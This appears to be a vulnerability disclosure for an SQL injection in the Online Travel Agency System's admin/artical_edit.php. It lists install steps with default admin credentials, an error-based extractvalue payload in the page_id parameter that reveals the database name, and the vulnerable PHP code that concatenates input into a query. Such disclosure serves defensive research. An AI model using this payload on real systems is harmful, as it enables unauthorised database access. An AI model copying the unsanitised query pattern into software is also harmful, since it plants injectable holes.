# [Online Travel Agency System-SQL Injection-artical_edit.php]

## Basic Information

**[Bug Reporter]:**  DililLearngent

**[Application Vendors]:**  https://www.sourcecodester.com/online-travel-agency-system-using-php.html

**[Test Environment]:**  windows10+apache+php7.0

**[Install]:**

1. start **Apache** and **MySQL**.

2. **Extract** the downloaded source code **zip** file.

3. **Copy** the extracted source code folder and **paste** it into the **www directory**.

4. **Create** a **new database** naming **"travel_agency"**.

5. **Import** the provided **SQL** file. The file is known as **"travel_agency.sql"** located inside the extracted source code folder.

6. **Browse** the **Online Travel Agency System** in a **browser**. i.e. **http://localhost/Travel**

   **Admin Access Information:**

   Username: **admin**
   Password: **admin**

## Bug Information

**[Vulnerability type]:** SQL Injection

**[Vulnerability Url]:** `http://10.142.221.111/Travel/admin/artical_edit.php?page_id=22`    

**[Vulnerability Location]:** Travel/admin/artical_edit.php

**[Vulnerability Test]:**

1. payload:`page_id=22%27%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))--+`

   ![](../../img/20230428165830.png)

   The database name was obtained from the above payload execution.

**[code analysis]:**

Travel/admin/artical_edit.php

```php
<?php

$page_id=$_GET['page_id'];
  $sql="select * from pages where page_id='$page_id'";
$result=mysqli_query($con,$sql) or die(mysqli_error($con));
$row=mysqli_fetch_array($result);
	  
	  $title=$row["title"];
	  $description=$row["description"];

?>
```

The GET parameter `page_id` is obtained without any filtering and spliced directly into the sql execution statement, and display the errors returned by the database execution back to the front-end page.

